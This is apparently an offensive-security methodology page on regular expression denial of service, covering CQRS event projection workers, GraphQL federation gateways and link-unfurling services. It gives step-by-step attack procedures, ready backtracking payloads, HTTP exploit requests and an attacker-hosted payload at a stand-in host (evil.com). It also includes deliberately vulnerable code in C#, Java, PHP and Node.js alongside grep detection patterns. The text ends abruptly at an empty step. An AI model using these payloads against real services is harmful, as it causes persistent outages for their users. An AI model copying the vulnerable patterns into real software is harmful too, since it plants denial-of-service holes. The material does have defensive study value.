# Regular Expression DoS

## Check List

## Methodology

### Black Box

### White Box

#### Incubated ReDoS via Event Replay in CQRS Projection Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on distributed applications utilizing Command Query Responsibility Segregation (CQRS) and Event Sourcing (e.g., Financial ledgers, Audit trails, or Enterprise Activity Feeds)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Event Store architecture. In CQRS, state mutations (Commands) are validated and appended to an immutable, append-only Event Store (e.g., Kafka, EventStoreDB, DynamoDB)
{% endstep %}

{% step %}
Investigate the Read Model Materialization pipeline. To make the immutable event stream queryable for the frontend, background Projection Workers asynchronously consume the Event Store and populate normalized relational database tables (Read Models)
{% endstep %}

{% step %}
Discover the "Regex Extraction" optimization within the Projection Worker. To support rich UI features like `@mentions`, `#hashtags`, or custom cross-reference linking (`REF-XXXX`), the Projector applies Regular Expressions to the raw event text _before_ inserting it into the SQL database, avoiding expensive SQL `LIKE` queries on the frontend
{% endstep %}

{% step %}
Analyze the execution context. The API edge validates the initial Command (e.g., `CreateCommentCommand`) for length and basic data types, but it does _not_ execute the extraction regex. The regex is strictly evaluated asynchronously by the backend Projector
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that because the event successfully passed the synchronous API edge and was durably persisted, the payload is structurally benign. They fail to implement regex timeouts inside the background projector, assuming background tasks are immune to HTTP timeout constraints
{% endstep %}

{% step %}
Formulate the Incubated ReDoS payload. Identify the specific extraction regex utilized by the Projector (e.g., a poorly optimized mention extractor `(@[a-zA-Z0-9_]+-*)+`)
{% endstep %}

{% step %}
Send a legitimate API request (e.g., creating a new Activity Log or Comment) containing an exponential backtracking string: `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@!`
{% endstep %}

{% step %}
The API Gateway validates the length (e.g., 200 characters is perfectly valid), accepts the request, and appends the `CommentCreated` event to the Event Store. The payload is now safely incubated
{% endstep %}

{% step %}
The asynchronous Projection Worker pulls the new event and attempts to extract the mentions using the vulnerable regex
{% endstep %}

{% step %}
The Projector's thread locks at 100% CPU. Because CQRS projectors process events sequentially to maintain causal ordering, the entire read-model materialization pipeline halts
{% endstep %}

{% step %}
The system experiences a catastrophic "Stale Read Model" failure. New data continues to be written to the Event Store via the API, but the UI never updates, permanently desynchronizing the application state
{% endstep %}

{% step %}
Crucially, even if DevOps restarts the Projection Worker pod, the worker will inherently resume from its last committed offset, immediately pulling the malicious event again and re-entering the death loop (a persistent Poison Pill)

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:public\s+async\s+Task\s+\w*Async\s*\([\s\S]{0,120}?\bEvent\b|Task\s+\w*ProjectAsync\s*\([\s\S]{0,100}?Event|IEventHandler<.*>\s*\{)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:@EventHandler\s*(?:public\s+)?void\s+\w+\s*\([\s\S]{0,120}?\bEvent\b|public\s+void\s+\w+\s*\([\s\S]{0,120}?Event|@Subscribe\s*\([\s\S]{0,100}?Event)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:public\s+function\s+\w*project\w*\s*\([\s\S]{0,120}?\$event|function\s+\w*Handler\s*\([\s\S]{0,120}?\$event|handle\s*\(\s*\$event\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:async\s+handleEvent\s*\([\s\S]{0,120}?\bevent\b|async\s+\w*Handler\s*\([\s\S]{0,120}?event|on\s*\(\s*['"][^'"]+['"]\s*,)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
public\s+async\s+Task\s+\w*ProjectAsync\(.*Event|IEventHandler<.*Event
```
{% endtab %}

{% tab title="Java" %}
```regexp
@EventHandler\s*public\s+void\s+\w+\(.*Event|@Subscribe.*Event
```
{% endtab %}

{% tab title="PHP" %}
```regexp
public\s+function\s+project.*Event\(.*\$event|function\s+handle.*\$event
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
async\s+handleEvent\(.*event|async\s+\w*Handler\(.*event
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class MentionProjectionWorker : IProjectionWorker
{
    // [1]
    // [2]
    // Vulnerable Regex: Catastrophic backtracking on overlapping repetitions
    private readonly Regex _mentionRegex = new Regex(@"(@[a-zA-Z0-9_]+-*)+", RegexOptions.Compiled);
    private readonly IReadModelRepository _readDb;

    public async Task ProjectAsync(IEvent streamEvent)
    {
        if (streamEvent is CommentCreatedEvent commentEvent)
        {
            // [3]
            // [4]
            var matches = _mentionRegex.Matches(commentEvent.Text);
            
            var extractedMentions = new List<string>();
            foreach (Match match in matches)
            {
                extractedMentions.Add(match.Value);
            }

            await _readDb.UpdateMentionsIndexAsync(commentEvent.CommentId, extractedMentions);
        }
        
        // Offset is only committed if the projection completes successfully
        await CommitOffsetAsync(streamEvent.Position);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
@ProcessingGroup("mention-projector")
public class MentionProjectionWorker {

    // [1]
    // [2]
    private final Pattern mentionPattern = Pattern.compile("(@[a-zA-Z0-9_]+-*)+");
    @Autowired
    private ReadModelRepository readDb;

    @EventHandler
    public void on(CommentCreatedEvent event) {
        // [3]
        // [4]
        Matcher matcher = mentionPattern.matcher(event.getText());
        List<String> extractedMentions = new ArrayList<>();
        
        // Evaluates synchronously on the Axon/Kafka event processor thread
        while (matcher.find()) {
            extractedMentions.add(matcher.group());
        }

        readDb.updateMentionsIndex(event.getCommentId(), extractedMentions);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class MentionProjectionWorker implements Projector
{
    protected $readDb;
    
    // [1]
    // [2]
    protected $mentionRegex = '/(@[a-zA-Z0-9_]+-*)+/';

    public function projectCommentCreated(CommentCreatedEvent $event): void
    {
        // [3]
        // [4]
        $matches = [];
        preg_match_all($this->mentionRegex, $event->text, $matches);
        
        $extractedMentions = $matches[0] ?? [];

        $this->readDb->updateMentionsIndex($event->commentId, $extractedMentions);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class MentionProjectionWorker {
    constructor() {
        // [1]
        // [2]
        this.mentionRegex = /(@[a-zA-Z0-9_]+-*)+/g;
    }

    async handleEvent(event) {
        if (event.type === 'CommentCreated') {
            // [3]
            // [4]
            // Node.js RegExp execution completely blocks the V8 Event Loop
            let extractedMentions = event.text.match(this.mentionRegex) || [];

            await readDb.updateMentionsIndex(event.commentId, extractedMentions);
        }
        
        await commitOffset(event.position);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Projection Worker subscribes to the immutable Event Store to materialize queryable read models for the frontend, \[2] To extract relational metadata (like tags or mentions) without taxing the SQL database, the developer implements a Regular Expression directly within the projection logic, \[3] The architecture separates input validation from data projection. The initial HTTP request was validated for basic constraints (like `MaxLength=500`) but not for regex safety, as the regex is a read-model optimization concern, \[4] The execution sink. The worker evaluates the regex against the historically persisted event payload. When the exponential backtracking payload is evaluated, the projector thread freezes. Because event processors must process events sequentially to maintain correct state projection, the failure to process this specific event completely halts the entire read-model pipeline. Restarting the pod simply fetches the same poisoned event from the persistent log, establishing an unrecoverable DoS

```http
// 1. Attacker identifies a standard text input field (e.g., a workspace comment) that drives a CQRS Projection.
// 2. Attacker crafts a payload designed to exploit the projection worker's extraction regex.

POST /api/v1/workspaces/WKS-123/comments HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "text": "Please review this document: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@!"
}

// 3. The API Gateway validates the length (86 chars), accepts the command, and writes to the Event Store.
// HTTP/1.1 201 Created

// 4. The asynchronous MentionProjectionWorker pulls the event from Kafka/EventStoreDB.
// 5. The worker invokes Regex.Matches(). The V8/CLR/JVM thread locks instantly.
// 6. The worker's Liveness probe fails. Kubernetes restarts the pod.
// 7. The new pod pulls the same event from the uncommitted offset. It locks instantly.
// 8. The entire enterprise read-model is permanently stalled. New comments are accepted but never appear in the UI.
```
{% endstep %}

{% step %}
To achieve extreme scalability, architects decoupled write operations from read operations using Event Sourcing and CQRS. They introduced metadata extraction routines into the asynchronous projection workers to optimize relational database queries. This architecture created a temporal displacement between data validation and data processing. Developers falsely assumed that because events were persisted into an immutable store via a strictly typed API, the payloads were structurally harmless. The attacker exploited this assumption by injecting an exponential backtracking payload into a standard text field. The API blindly appended the poison pill to the event log. When the projection worker retrieved the event and applied its extraction regex, the execution thread froze. Because CQRS guarantees strict event ordering, the inability to process the malicious event permanently stalled the materialization pipeline, resulting in a systemic, architecture-level Denial of Service.
{% endstep %}
{% endstepper %}

***

#### Infrastructure Paralysis via JIT-Compiled Directives in GraphQL Federation Gateways

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise GraphQL APIs utilizing a Supergraph/Federation architecture (e.g., Apollo Federation), where an API Gateway composes multiple downstream Subgraphs into a unified schema
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway routing and composition layer
{% endstep %}

{% step %}
Identify the "Declarative Input Validation" architecture. In a federated graph, pushing validation logic down to every microservice creates massive code duplication. To solve this, platform engineers implement custom GraphQL directives (e.g., `@constraint(pattern: "^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}$")`)
{% endstep %}

{% step %}
Investigate the schema composition optimization. When the Gateway starts up, it polls the Subgraphs, reads their schemas (including the `@constraint` directives), and synthesizes a global validation pipeline in memory
{% endstep %}

{% step %}
Discover the JIT Compilation behavior: To minimize evaluation latency on every incoming GraphQL request, the API Gateway dynamically compiles the regex strings extracted from the Subgraph directives into native `RegExp` objects during the gateway bootstrap phase
{% endstep %}

{% step %}
Analyze the execution context. The Gateway processes incoming queries, extracts the user's input variables, and executes the pre-compiled regular expressions _synchronously_ on the Gateway's main thread before proxying the request to the Subgraph
{% endstep %}

{% step %}
Understand the architectural assumption: The Gateway engineers explicitly trust the Subgraph developers. They assume that internal microservice teams will only supply highly optimized, mathematically safe regular expressions within their schema definitions
{% endstep %}

{% step %}
Formulate the Cross-Service ReDoS payload. Because the vulnerability lies in the Gateway's evaluation loop, the attacker does not need to compromise the Subgraph itself. They simply need to find _any_ slightly inefficient regex deployed by _any_ internal team across the entire Supergraph
{% endstep %}

{% step %}
Review the public GraphQL schema (via Introspection or open source client tracking). Identify a custom scalar or constrained input utilizing a vulnerable regex (e.g., an overly complex URL validator or custom business identifier)
{% endstep %}

{% step %}
Construct a massive GraphQL payload. GraphQL natively supports query batching and aliasing. To ensure the regex engine blocks for a catastrophic amount of time, bypass standard web application firewall (WAF) size limits by nesting the payload deeply or using GraphQL variables
{% endstep %}

{% step %}
Example Payload: Submit a mutation requesting the vulnerable field, providing the exponential backtracking string (e.g., `a@a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.!`)
{% endstep %}

{% step %}
Transmit the GraphQL payload to the Edge Gateway
{% endstep %}

{% step %}
The Gateway receives the request. The validation middleware intercepts the input and applies the compiled `@constraint` regex synchronously on the event loop
{% endstep %}

{% step %}
The regex engine locks. The Gateway's primary event loop freezes. All concurrent routing, authentication, and response handling for _every_ downstream service halts immediately, causing a global Supergraph outage

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Regex\s*\([\s\S]{0,120}?(?:constraint|validation|pattern)|Regex\s*\(\s*\w*(?:Pattern|pattern)\w*\s*\)|RegexOptions[\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\([\s\S]{0,120}?(?:constraint\.pattern\(\)|pattern|regex)|Pattern\.compile\s*\(\s*\w+\s*\)|javax\.validation.*pattern)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*\$constraint->pattern\s*\(|preg_match\s*\([\s\S]{0,120}?(?:\$pattern|\$regex)|new\s+RegexValidator\s*\([\s\S]{0,100}?pattern)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+RegExp\s*\(\s*(?:directive\.arguments\.pattern|pattern|regex)[\s\S]{0,80}?\)|RegExp\s*\([\s\S]{0,100}?pattern|\.match\s*\(\s*(?:pattern|regex))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Regex\(.*(pattern|constraint)|Regex\(.*pattern
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\(constraint\.pattern\(\)\)|Pattern\.compile\(.*pattern
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(\$constraint->pattern|preg_match\(.*\$pattern
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
new\s+RegExp\(directive\.arguments\.pattern\)|new\s+RegExp\(.*pattern
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ConstraintValidationMiddleware
{
    private readonly FieldDelegate _next;
    private readonly ConcurrentDictionary<string, Regex> _compiledConstraints = new();

    public ConstraintValidationMiddleware(FieldDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(IMiddlewareContext context)
    {
        // [1]
        // [2]
        var field = context.Selection.Field;
        var constraintDirective = field.Directives.FirstOrDefault(d => d.Name == "constraint");

        if (constraintDirective != null)
        {
            var pattern = constraintDirective.GetArgument<string>("pattern");
            
            // [3]
            var regex = _compiledConstraints.GetOrAdd(field.Name, p => new Regex(p, RegexOptions.Compiled));

            foreach (var argument in context.Selection.SyntaxNode.Arguments)
            {
                var inputString = argument.Value.ToString();
                
                // [4]
                // Blocks the main GraphQL execution pipeline synchronously
                if (!regex.IsMatch(inputString))
                {
                    context.ReportError("Constraint validation failed.");
                    return;
                }
            }
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class ConstraintValidationMiddleware {

    private final FieldDelegate next;

    private final ConcurrentHashMap<String, Pattern> compiledConstraints = new ConcurrentHashMap<>();

    public ConstraintValidationMiddleware(FieldDelegate next) {
        this.next = next;
    }

    public CompletableFuture<Void> invokeAsync(MiddlewareContext context) {

        // [1]
        // [2]
        Field field = context.getSelection().getField();

        Directive constraintDirective = field.getDirectives()
                .stream()
                .filter(d -> d.getName().equals("constraint"))
                .findFirst()
                .orElse(null);

        if (constraintDirective != null) {

            String pattern = constraintDirective.getArgument("pattern");

            // [3]
            Pattern regex = compiledConstraints.computeIfAbsent(
                    field.getName(),
                    p -> Pattern.compile(pattern)
            );

            for (Argument argument : context.getSelection()
                    .getSyntaxNode()
                    .getArguments()) {

                String inputString = argument.getValue().toString();

                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!regex.matcher(inputString).matches()) {

                    context.reportError(
                        "Constraint validation failed."
                    );

                    return CompletableFuture.completedFuture(null);
                }
            }
        }

        return next.invoke(context);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ConstraintValidationMiddleware
{
    private $next;

    private array $compiledConstraints = [];

    public function __construct(callable $next)
    {
        $this->next = $next;
    }


    public function invokeAsync($context)
    {
        // [1]
        // [2]
        $field = $context->selection->field;

        $constraintDirective = null;

        foreach ($field->directives as $directive) {

            if ($directive->name === "constraint") {
                $constraintDirective = $directive;
                break;
            }
        }


        if ($constraintDirective !== null) {

            $pattern = $constraintDirective
                ->getArgument("pattern");


            // [3]
            if (!isset($this->compiledConstraints[$field->name])) {

                $this->compiledConstraints[$field->name] =
                    $pattern;
            }

            $regex = $this->compiledConstraints[$field->name];


            foreach (
                $context->selection
                    ->syntaxNode
                    ->arguments as $argument
            ) {

                $inputString = (string)$argument->value;


                // [4]
                // Blocks GraphQL execution pipeline synchronously
                if (!preg_match($regex, $inputString)) {

                    $context->reportError(
                        "Constraint validation failed."
                    );

                    return null;
                }
            }
        }


        return call_user_func(
            $this->next,
            $context
        );
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { ApolloGateway } = require('@apollo/gateway');

class ConstraintValidationPlugin {
    // [1]
    // [2]
    // Executes during Supergraph composition
    requestDidStart({ schema }) {
        const compiledRegexes = new Map();

        // Recursively extract @constraint directives from the composed schema
        Object.values(schema.getTypeMap()).forEach(type => {
            if (type.astNode && type.astNode.directives) {
                const constraint = type.astNode.directives.find(d => d.name.value === 'constraint');
                if (constraint) {
                    const patternArg = constraint.arguments.find(a => a.name.value === 'pattern');
                    if (patternArg) {
                        // [3]
                        // Blindly compiles the Subgraph-provided regex into the Gateway's memory
                        compiledRegexes.set(type.name, new RegExp(patternArg.value.value));
                    }
                }
            }
        });

        return {
            async executionDidStart({ request }) {
                // [4]
                // Intercepts variables BEFORE passing the query to the Subgraph
                for (const [key, value] of Object.entries(request.variables || {})) {
                    const regex = compiledRegexes.get(key); // Simplified type matching for brevity
                    if (regex && !regex.test(value)) {
                        throw new Error(`Validation failed for ${key}`);
                    }
                }
            }
        };
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway implements a centralized validation pipeline to offload repetitive input checking from downstream Subgraphs, \[2] To support a dynamic, federated schema, the Gateway discovers validation rules automatically by parsing `@constraint` directives declared within the individual Subgraph definitions, \[3] To minimize runtime latency, the Gateway extracts the regex patterns during the schema composition phase and compiles them directly into highly optimized, native Regular Expression objects, \[4] The execution sink. The Gateway's validation middleware intercepts incoming user variables and executes the pre-compiled regex synchronously. The architectural failure occurs because the Gateway engineers implicitly trusted the structural safety of the regexes provided by distributed, independent Subgraph development teams. When an attacker feeds a catastrophic backtracking payload into a slightly inefficient pattern, the Gateway's primary event loop freezes, obliterating routing capacity for the entire enterprise mesh

```http
// 1. Attacker interrogates the GraphQL schema and identifies a vulnerable @constraint directive 
// on a low-value Subgraph (e.g., Marketing Signup).
// Pattern identified: ^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$

// 2. Attacker crafts a GraphQL request targeting the vulnerable input.
POST /graphql HTTP/1.1
Host: gateway.enterprise.tld
Content-Type: application/json

{
  "query": "mutation Signup($email: String!) { subscribeToNewsletter(email: $email) { success } }",
  "variables": {
    "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!@example.com"
  }
}

// 3. The Apollo Gateway receives the request.
// 4. The Gateway validation plugin extracts the 'email' variable.
// 5. The Gateway invokes compiledRegex.test(email) synchronously.
// 6. The V8 Event Loop locks evaluating the overlapping character classes before the @ symbol.
// 7. All other requests traversing the Gateway (Payments, Authentication, Core Services) immediately hang.
// 8. The Gateway fails its readiness probe and is terminated by Kubernetes.
```
{% endstep %}

{% step %}
To enforce declarative, schema-driven security without sacrificing Supergraph performance, architects centralized input validation at the API Gateway using JIT-compiled GraphQL directives. This optimization fundamentally decoupled the authorship of the regular expression (the Subgraph developers) from the execution environment of the regular expression (the Edge Gateway). The gateway engineers erroneously equated internal team boundaries with cryptographic safety, compiling un-audited strings directly into the gateway's critical path. The attacker weaponized this trust by scanning the global schema for a mathematically inefficient validation rule. By passing a catastrophic backtracking payload to that specific field, the attacker forced the Gateway's single-threaded event loop to lock. Because the Gateway routes traffic for the entire distributed architecture, a minor regex flaw in a non-critical microservice was elevated into a systemic, total-platform Denial of Service.
{% endstep %}
{% endstepper %}

***

#### Memory Exhaustion via Stream Truncation Asymmetry in Rich Media Unfurling

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise collaboration platforms, messaging apps, or social feeds that generate automated "Rich Previews" (Link Unfurling) when a user posts a URL
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind.
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Metadata Extraction" architecture. When a user posts a link (e.g., `[https://example.com](https://example.com)`), a background microservice initiates an outbound HTTP request to fetch the OpenGraph metadata (`<meta property="og:title" content="...">`) to generate a preview card
{% endstep %}

{% step %}
Investigate the I/O bottleneck. Downloading massive, multi-gigabyte ISOs or video files simply to parse HTML tags would cause instantaneous Disk and RAM exhaustion on the unfurling workers
{% endstep %}

{% step %}
Discover the "Stream Truncation" optimization. To safely process untrusted remote resources, the developer configures the HTTP client to stream the response and forcefully closes the TCP socket after reading exactly 100 Kilobytes
{% endstep %}

{% step %}
Analyze the HTML parsing logic. Because 100KB of a truncated HTML document is mathematically guaranteed to be structurally malformed (missing closing `</html>` or `<body>` tags), robust DOM parsers (like AngleSharp or JSoup) frequently throw fatal exceptions or require massive memory allocations to attempt structural recovery
{% endstep %}

{% step %}
Understand the architectural workaround: To rapidly extract metadata from broken, truncated HTML chunks, the developer abandons strict DOM parsing. Instead, they apply a highly permissive, multi-line Regular Expression directly against the raw 100KB string buffer
{% endstep %}

{% step %}
Formulate the Truncation ReDoS payload. You must exploit the permissive nature of the HTML-extraction regex (e.g., `(?is)<meta[^>]+property=[\"']og:title[\"'][^>]*content=[\"']([^\"']+)[\"']`)
{% endstep %}

{% step %}
Configure an external, attacker-controlled web server to respond to HTTP GET requests
{% endstep %}

{% step %}
Return an HTML document that begins with the exact prefix required to engage the regex engine (e.g., `<meta property="og:title" content="`)
{% endstep %}

{% step %}
Immediately following the prefix, pad the remainder of the 100KB response with a sequence designed to trigger catastrophic backtracking within the `[^>]*` or `([^\"']+)` capture groups (e.g., overlapping whitespace, unclosed quotes, and HTML attributes without closing tags)
{% endstep %}

{% step %}
Post the URL of your attacker-controlled server into the collaboration platform's chat interface
{% endstep %}

{% step %}
The platform's Unfurling Worker initiates a connection to your server. It downloads exactly 100KB of your poisoned HTML, gracefully truncates the stream to prevent memory exhaustion, and passes the raw string into the regex engine
{% endstep %}

{% step %}
The regex engine attempts to match the malformed metadata tag across the massive 100KB string. The catastrophic backtracking locks the thread. The unfurling queue backs up, exhausting the thread pool, and permanently disabling media previews and message delivery across the platform

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Regex\.Match\s*\([\s\S]{0,120}?(?:<\s*meta|property|og:)|Regex\.Matches\s*\([\s\S]{0,120}?meta|@"<\s*meta[^>]*property)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Pattern\.compile\s*\(\s*"(?i)?<\s*meta|Pattern\.compile\s*\([\s\S]{0,120}?(?:meta|og:)|Matcher\.find\s*\([\s\S]{0,100}?meta)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:preg_match\s*\(\s*['"]/?.*<\s*meta[\s\S]{0,150}?(?:og:title|property)|preg_match\s*\([\s\S]{0,150}?og:|preg_match_all\s*\([\s\S]{0,120}?meta)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:rawHtml\.match\s*\([\s\S]{0,120}?<\s*meta[\s\S]{0,120}?og:|html\.match\s*\([\s\S]{0,120}?meta|new\s+RegExp\s*\([\s\S]{0,100}?meta)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Regex\.Match\(.*<\s*meta.*property|Regex\.Matches\(.*meta.*og:    
```
{% endtab %}

{% tab title="Java" %}
```regexp
Pattern\.compile\("(?i)<meta.*property|Pattern\.compile\(.*meta.*og:
```
{% endtab %}

{% tab title="PHP" %}
```regexp
preg_match\(.*<meta.*og:title|preg_match_all\(.*meta.*og:
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
rawHtml\.match\(/<meta.*og:title|html\.match\(.*meta.*og:
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class LinkUnfurlingService : IHostedService
{
    // [1]
    // [2]
    // Highly permissive regex to account for malformed HTML in the wild
    private readonly Regex _ogTitleRegex = new Regex(@"<meta[^>]+property=[""']og:title[""'][^>]*content=[""']([^""']+)[""']", RegexOptions.IgnoreCase | RegexOptions.Compiled);
    private readonly HttpClient _httpClient;

    public async Task<PreviewCard> GeneratePreviewAsync(string url)
    {
        using var response = await _httpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
        
        // [3]
        // Truncate stream at 100KB to prevent memory exhaustion
        var buffer = new char[100 * 1024];
        using var reader = new StreamReader(await response.Content.ReadAsStreamAsync());
        int bytesRead = await reader.ReadAsync(buffer, 0, buffer.Length);
        
        var rawHtml = new string(buffer, 0, bytesRead);

        // [4]
        // Synchronous evaluation of a complex regex against a 100KB string
        var match = _ogTitleRegex.Match(rawHtml);
        
        if (match.Success)
        {
            return new PreviewCard { Title = match.Groups[1].Value };
        }
        
        return null;
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class LinkUnfurlingService {

    // [1]
    // [2]
    private final Pattern ogTitlePattern = Pattern.compile("(?i)<meta[^>]+property=[\"']og:title[\"'][^>]*content=[\"']([^\"']+)[\"']");
    @Autowired
    private RestTemplate restTemplate;

    public PreviewCard generatePreview(String url) throws Exception {
        // [3]
        // Stream download with strict 100KB truncation
        RequestCallback requestCallback = request -> request.getHeaders()
                .setAccept(Arrays.asList(MediaType.TEXT_HTML, MediaType.APPLICATION_XHTML_XML));
        
        ResponseExtractor<String> responseExtractor = response -> {
            InputStream is = response.getBody();
            byte[] buffer = new byte[100 * 1024];
            int bytesRead = is.read(buffer);
            return new String(buffer, 0, Math.max(bytesRead, 0), StandardCharsets.UTF_8);
        };

        String rawHtml = restTemplate.execute(url, HttpMethod.GET, requestCallback, responseExtractor);

        // [4]
        if (rawHtml != null) {
            Matcher matcher = ogTitlePattern.matcher(rawHtml);
            if (matcher.find()) {
                return new PreviewCard(matcher.group(1));
            }
        }
        
        return null;
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class LinkUnfurlingService 
{
    // [1]
    // [2]
    protected $ogTitleRegex = '/<meta[^>]+property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']/i';

    public function generatePreview(string $url): ?PreviewCard 
    {
        // [3]
        // Stream wrapper to fetch only the first 100KB
        $context = stream_context_create(['http' => ['method' => 'GET', 'header' => "Accept: text/html\r\n"]]);
        $stream = fopen($url, 'r', false, $context);
        
        if (!$stream) return null;

        $rawHtml = stream_get_contents($stream, 100 * 1024);
        fclose($stream);

        // [4]
        if (preg_match($this->ogTitleRegex, $rawHtml, $matches)) {
            return new PreviewCard($matches[1]);
        }

        return null;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class LinkUnfurlingService {
    static async generatePreview(url) {
        // [1]
        // [2]
        const ogTitleRegex = /<meta[^>]+property=["']og:title["'][^>]*content=["']([^"']+)["']/i;

        // [3]
        // Axios stream response
        const response = await axios({
            method: 'get',
            url: url,
            responseType: 'stream'
        });

        let rawHtml = '';
        return new Promise((resolve, reject) => {
            response.data.on('data', (chunk) => {
                rawHtml += chunk.toString('utf8');
                // Truncate stream explicitly at 100KB
                if (rawHtml.length >= 100 * 1024) {
                    response.data.destroy(); 
                }
            });

            response.data.on('close', () => {
                // [4]
                // Regex executes on the main event loop against a 100KB malformed string
                const match = rawHtml.match(ogTitleRegex);
                if (match && match[1]) {
                    resolve({ title: match[1] });
                } else {
                    resolve(null);
                }
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The microservice is responsible for resolving rich media previews when users share URLs in the messaging platform, \[2] To support the chaotic variance of HTML formatting on the open internet, the developer utilizes a highly permissive regex incorporating extensive wildcard matchers (`[^>]+`, `.*`), \[3] To protect the infrastructure from Denial of Service via massive file downloads, the developer enforces strict I/O bounds, explicitly truncating the HTTP stream at 100 Kilobytes, \[4] The fatal optimization trade-off. Because truncating a stream in the middle of a document fundamentally corrupts the HTML structure, the developer cannot use a robust DOM parser. They fall back to string-based Regular Expressions. The developer falsely assumed that restricting the string length to 100KB mitigated ReDoS. However, a 100KB string is massively larger than the threshold required to trigger exponential backtracking. The attacker supplies a tailored 100KB block of repeating, non-terminating characters, trapping the permissive regex engine in millions of evaluation branches and locking the unfurling worker indefinitely

```http
// 1. Attacker controls a web server at https://evil.com/preview
// 2. Attacker writes a script to generate the payload and host it on the server.
// The payload starts the match but never finishes the closing tag, padding exactly 100,000 characters of spaces/attributes.

// payload_generator.py:
// payload = '<meta property="og:title" ' + (' ' * 50000) + ('a="' * 10000) + '!'
// write_to_file('index.html', payload)

// 3. Attacker posts the link in the Enterprise Chat application:
POST /api/v1/messages HTTP/1.1
Host: chat.enterprise.tld
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "channelId": "C12345",
  "text": "Check out this new design: https://evil.com/preview"
}

// 4. The Async Unfurling Worker picks up the URL and initiates a GET request to evil.com.
// 5. The attacker's server returns the 100KB malformed payload.
// 6. The worker cleanly truncates the stream, protecting its RAM.
// 7. The worker executes regex.Match() against the payload.
// 8. The regex engine evaluates the [^>]+ and [^"']+ groups against 100,000 overlapping characters.
// 9. The thread freezes. The Unfurling microservice queue overflows, disabling rich media previews platform-wide.
```
{% endstep %}

{% step %}
